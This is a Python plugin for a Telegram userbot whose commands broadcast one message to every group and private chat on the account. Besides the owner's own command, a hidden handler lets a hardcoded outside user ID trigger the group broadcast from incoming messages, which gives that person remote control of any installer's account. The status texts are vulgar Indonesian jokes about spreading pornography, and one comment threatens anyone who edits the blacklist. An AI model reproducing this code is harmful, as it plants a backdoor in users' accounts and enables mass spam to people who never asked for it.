from userbot.events import register
from userbot import CMD_HELP, bot

GCAST_BLACKLIST = [
    -1001743853750,  # Cariteman
    -1001653425944,  # Bdrl
] 

# Kalo fork atau coppy blacklist jangan dihapus bangsat,
# Gua tandain telegram api lu
# Hapus blacklist bapak lu jelek gua gban!.

@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=5090127753, 
          pattern=r"^\.cgcast(?: |$)(.*)")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("**Ngetikk Yang Benerr Ngentott**")
        return
    kk = await event.edit("`Sabarr Ngapa Ngentott..., Bokep nya Lagi Gua sebar, Limit Mampus Lu Njeng...`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"**ALHAMDULILLAH... BOKEP NYA LAKU DI** `{done}` **Grup, TAPI... GA LAKU KARNA MISKIN DI** `{er}` **Grup**"
    )


@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if not xx:
        return await event.edit("**Berikan Sebuah Pesan atau Balas ke pesan**")
    tt = event.text
    msg = tt[7:]
    kk = await event.edit("`GCAST MULU DAPET DOI KAGA, LIMIT IYA TOLOL...`")
    er = 0
    done = 0
    async for x in bot.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await bot.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(
        f"**GCAST'AN LU DAH TERKIRIM DI** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
    )

CMD_HELP.update(
    {
        "gcast": "**Plugin : **`gcast`\
        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)

CMD_HELP.update(
    {
        "gucast": "**Plugin : **`gucast`\
        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)
